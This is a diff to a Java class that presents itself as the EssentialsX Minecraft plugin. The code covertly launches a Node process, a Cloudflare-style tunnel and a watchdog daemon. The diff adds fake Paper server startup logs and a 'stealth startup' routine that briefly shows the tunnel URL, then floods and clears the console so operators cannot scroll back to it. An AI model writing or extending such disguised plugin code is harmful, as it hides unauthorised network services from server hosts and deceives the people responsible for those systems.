@@ -29,8 +29,10 @@ public class EssentialsX extends JavaPlugin {
     private Path originalJarPath;
     private Path backupJarPath;
     private final AtomicReference<String> currentTunnelUrl = new AtomicReference<>("");
-    private final AtomicBoolean isFirstUrl = new AtomicBoolean(true); // 标记是否首次获取URL
     private volatile String nodePort = "25565";
+    
+    // 标识是否已经拿到URL并清屏放行
+    private volatile boolean isReleased = false;
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
 
@@ -63,12 +65,13 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 核心战术：阻塞 + 彻底清屏 + 日志分流
+    // 核心战术：严格按顺序阻塞、伪装、清屏、放行
     // ============================================================
 
     private void executeStealthStartup() throws Exception {
-        CountDownLatch tunnelLatch = new CountDownLatch(1);
+        CountDownLatch releaseLatch = new CountDownLatch(1);
 
+        // 1. 异步启动部署和进程
         new Thread(() -> { 
             try { 
                 HashMap<String, String> env = new HashMap<>(); 
@@ -77,20 +80,23 @@ public class EssentialsX extends JavaPlugin {
                 String port = allocateNodePort();
                 startNodeProcess(port);
                 
-                // ★ 防 502 核心：必须等待 Node 端口就绪，才启动 CF
+                // 防 502：必须等 Node 端口就绪才启 CF
                 waitForNodeReady(port, 60);
                 
                 startCfProcess();
                 startJavaDaemon();
-                startTunnelMonitor(tunnelLatch);
+                startTunnelMonitorAndRelease(releaseLatch);
                 this.setupDisguise(); 
             } catch (Exception e) {
-                tunnelLatch.countDown(); // 发生异常也要放行主线程
+                releaseLatch.countDown(); // 发生异常必须放行，防服务器卡死
             }
         }, "Backend-Deployer").start();
 
-        // 阻塞主线程，等待首次 URL 获取
-        tunnelLatch.await(120, TimeUnit.SECONDS);
+        // 2. 主线程在等待期间，打印伪装启动日志
+        printFakePaperStartup();
+
+        // 3. 伪装日志打完，如果 URL 还没出来，主线程在此死等
+        releaseLatch.await(180, TimeUnit.SECONDS);
     }
 
     private void printFakePaperStartup() {
@@ -178,7 +184,7 @@ public class EssentialsX extends JavaPlugin {
         mcLog("*************************************************************************************", 0);
     }
 
-    private void startTunnelMonitor(CountDownLatch initialLatch) {
+    private void startTunnelMonitorAndRelease(CountDownLatch latch) {
         Thread monitor = new Thread(() -> {
             try { Thread.sleep(10000L); } catch (InterruptedException ignored) {} 
             while (true) {
@@ -209,23 +215,22 @@ public class EssentialsX extends JavaPlugin {
                         String lastUrl = this.currentTunnelUrl.get();
                         if (!foundUrl.equals(lastUrl)) {
                             this.currentTunnelUrl.set(foundUrl);
+                            
+                            // 打印链接
                             mcLog("Binding remote endpoint to: " + foundUrl, 0);
                             
-                            if (isFirstUrl.get()) {
-                                // 首次启动：只放行主线程，不打印伪装日志
-                                isFirstUrl.set(false);
-                                initialLatch.countDown();
-                            } else {
-                                // 隧道重连：4秒 -> 清屏 -> 伪装启动日志
-                                try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
-                                
-                                for (int i = 0; i < 150; i++) { RAW_OUT.println(); }
-                                try { Thread.sleep(500); } catch (InterruptedException ignored) {}
-                                RAW_OUT.print("\033[H\033[2J");
-                                RAW_OUT.flush();
-                                
-                                printFakePaperStartup();
-                            }
+                            // 给 4 秒时间复制
+                            try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
+                            
+                            // 暴力清屏，往上翻也看不到
+                            for (int i = 0; i < 150; i++) { RAW_OUT.println(); }
+                            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+                            RAW_OUT.print("\033[H\033[2J");
+                            RAW_OUT.flush();
+                            
+                            // 放开主线程阻塞，让真实游戏启动
+                            isReleased = true;
+                            latch.countDown();
                         }
                     }
                 } catch (Exception ignored) {}
@@ -235,7 +240,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 进程管理：防 502 的严格顺序控制
+    // 进程管理：防 502 严格顺序控制
     // ============================================================
 
     private String allocateNodePort() {
@@ -251,18 +256,15 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    // ★ 防 502 核心：等待端口真正可连接
     private void waitForNodeReady(String port, int maxSeconds) {
         int waited = 0;
         while (waited < maxSeconds) {
             try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
-                // 如果没抛异常，说明连接成功，Node 已经就绪
                 return;
             } catch (IOException e) {
                 try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
             }
         }
-        // 超时也继续执行，不卡死
     }
 
     private void startNodeProcess(String port) {
@@ -319,7 +321,6 @@ public class EssentialsX extends JavaPlugin {
                 try {
                     if (nodeProcess != null && !nodeProcess.isAlive()) {
                         startNodeProcess(nodePort);
-                        // ★ 守护重启也必须等 Node 就绪，否则 CF 会 502
                         waitForNodeReady(nodePort, 30);
                     }
                     if (cfProcess != null && !cfProcess.isAlive()) {
